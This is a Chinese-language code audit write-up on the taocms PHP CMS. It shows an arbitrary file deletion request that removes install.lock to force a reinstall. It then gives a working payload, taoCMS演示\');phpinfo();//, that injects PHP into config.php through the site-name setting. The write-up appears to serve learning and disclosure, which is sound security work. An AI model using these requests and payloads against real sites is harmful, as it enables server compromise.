## taocms 代码审计学习

## 背景
在 github 中发现了一套开源的 php 类型的 taocms，被很多大佬提交了issue。自己对 php 代码的审计不是很熟悉，本着学习的态度，简单测试一下，看看有没有其他的 getshell 方式。
链接：https://github.com/taogogo/taocms

![image](https://user-images.githubusercontent.com/39737245/179382789-8da786c3-1211-4f2b-9c36-b879c78fadf7.png)

## 尝试重装 getshell

1. 打开 taocms/include/Model/File.php，发现文件删除的代码，请求的路径为 `admin.php?action=file&ctrl=del&path=`，path 参数可控。
通过构造函数赋值给 File 类的 path 属性，`$this->path=$_REQUEST['path'];`。
del 函数会对 path 进行检查，如果 path 为文件路径，则直接删除。如果 path 为目录路径，则判断目录是否为空，为空则直接删除。

![image](https://user-images.githubusercontent.com/39737245/179346909-19d27934-3f65-458a-877c-2d64d205edf5.png)
![image](https://user-images.githubusercontent.com/39737245/179341807-abf00881-056b-44b8-9bea-488f3b575131.png)

2. 当 taocms 安装时，在 data 目录下会生成一个 install.lock 文件，install.lock 文件代表已经安装的意思。

![image](https://user-images.githubusercontent.com/39737245/179341924-316ea8c6-83c1-4a72-8d85-5c5fd3a16fbb.png)

3. 当安装完成后，再次访问 install.php 时，会提示不能再次安装，所以需要重装必须删除 install.lock 文件。

![image](https://user-images.githubusercontent.com/39737245/179342073-215bee64-5d34-428a-8f4f-5a5a506605d8.png)

4. 因为存在任意文件删除，我们可以通过下面的请求来删除 install.lock 文件。

```
GET /admin/admin.php?action=file&ctrl=del&path=/data/install.lock HTTP/1.1
Host: 127.0.0.1:9999
User-Agent: Mozilla/5.0 (Windows NT 10.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.7113.93 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Connection: close
Referer: http://127.0.0.1:9999/admin/admin.php?action=file&ctrl=lists
Cookie: PHPSESSID=tnbrlgg1g539t0mjovqs1vrgio
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: frame
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1
```

5. 执行完上面的请求，install.lock 文件删除成功。

![image](https://user-images.githubusercontent.com/39737245/179342236-1c55b3bb-22a0-4ab2-9b37-6c90a9143003.png)

6. 这时，重新访问 install.php，已经可以显示安装页面。

![image](https://user-images.githubusercontent.com/39737245/179342306-39cc40e9-fa11-4a69-adf4-a7e1a985b553.png)

7. 我们先来看一下 config.php 文件，在执行 install.php 安装时，会把相关配置写进 config.php 文件中，以 define 来定义，如下所示：
```
define('CACHELAST',	'1');
define('INC',	'include/');
define('DB',	'Sqlite');
define('DB_NAME',	'|127.0.0.1:3306|root|root|taocms');
define('MEMCACHE',	'');
define('TB',	'cms2_');
```

8. 现在我们以 DB_NAME 这个变量来构造 payload `|127.0.0.1:3306|root|root|taocms|');phpinfo();//`，按照理论说如果安装成功，那么 `define('DB_NAME',	'|127.0.0.1:3306|root|root|taocms|');phpinfo();//');` 将以这种形式存在 config.php 文件中，且没有语法错误。

![image](https://user-images.githubusercontent.com/39737245/179431797-b59cd5bc-83ac-42f7-80ca-6e0831dad61e.png)

9. 可是在安装完成后，查看 config.php 文件，DB_NAME 并没有像预期那样被写在 config.php 文件，单引号（'）被过滤了。

![image](https://user-images.githubusercontent.com/39737245/179431994-a392915d-f8e0-4eb9-9ac1-1220f51e891b.png)

10. 分析 install.php 的源码，在 25-27 行发现了过滤代码，会对提交的 post 参数进行一次循环替换，非法字符将会被替换为空。

![image](https://user-images.githubusercontent.com/39737245/179432384-c6abbaee-a07e-434b-a499-330225a05db1.png)

比如下面的例子，字符串中的 `\ ' " `等都被替换为空：

```
<?php
$_POST['db_name'] = 'test\'"``;\\';

foreach($_POST as $k => $v){
	$_POST[$k] = preg_replace('/[^ \w\-\!\@\#\$\%\^\&\*\(\)\_\+\=\{\}\[\]\;\:\<\>\,\.\/\?\|]/', '', $v);
	}

var_dump($_POST);
?>

array(1) {
  'db_name' =>
  string(5) "test;"
}
```

经过测试，通过重装来 getshell 这条路似乎行不通。接下来我们寻找其他的方式，看看后台管理功能中能不能修改配置，从而把 php 代码注入到 config.php 中。

## 尝试修改配置 getshell

1. 进入到后台中，有个网站设置的功能，可以修改关于网站的一些设置，比如网站名称，网站地址，数据库等。

![image](https://user-images.githubusercontent.com/39737245/179381624-70b8a26f-29c1-4208-b373-fff0250394df.png)

2. 接下来，尝试能不能通过修改这些设置来注入php代码。从 config.php 文件中发现，修改的配置会直接更新 config.php 文件。

![image](https://user-images.githubusercontent.com/39737245/179381660-880f02c2-211c-40bc-87d7-f6f53994d864.png)

3. 比如网站名称以下面的方式写在 config.php 文件中。

```
define('WEBNAME',	'taoCMS演示');
```

4. 所以，根据 php 的语法规则，构造了下面的 payload 并发送了一个请求。

![image](https://user-images.githubusercontent.com/39737245/179381735-40aef3c1-2b4d-4cbf-bf30-a16d64cef477.png)

```
payload: taoCMS演示');phpinfo();//
```
5. 但是在执行完上面的请求后，config.php 文件会出现语法错误，多了一个单引号'）。
```
define('WEBNAME',	'taoCMS演示'');phpinfo();//');
```
![image](https://user-images.githubusercontent.com/39737245/179381766-e03eab52-9f9a-4eef-aaef-cedd05f773b0.png)

6. 发生这种错误，只能去 taocms/include/Config.php 查看源码。发现在修改这些配置时，safeword 函数会对这些配置进行安全检查和过滤。

![image](https://user-images.githubusercontent.com/39737245/179381827-633154f9-d815-474f-8ddb-c2e4eae7690f.png)

7. 再跟随 safeword 函数到 taocms/include/Base.php 文件，在 safeword 函数内，发现当数据库类型为 sqlite 时，单引号会被双写。
这也就是为什么刚刚看到了两个单引号导致语法错误。

![image](https://user-images.githubusercontent.com/39737245/179381928-2e52e418-9ebb-4663-960b-fb0b6f189eb2.png)

8. 现在我们来修改一下 payload，添加一个转义符 (\\) 转义一个单引号 (')，这样语法应该不会再出现错误。

```
payload: taoCMS演示\');phpinfo();//
```
![image](https://user-images.githubusercontent.com/39737245/179382078-ad2fa268-9f76-4c31-a223-a46eb659c45c.png)

9. 再次请求修改发送新的 payload，这一次已经成功更改配置并在 config.php 中没有出现语法错误。

![image](https://user-images.githubusercontent.com/39737245/179382134-f29035ce-4cb9-4e98-acbf-4677830deeb6.png)

10. 接下来访问 config.php，注入的 php 代码成功运行。

![image](https://user-images.githubusercontent.com/39737245/179382173-55450e32-b36a-4e7b-a1c0-d28c7fde79de.png)
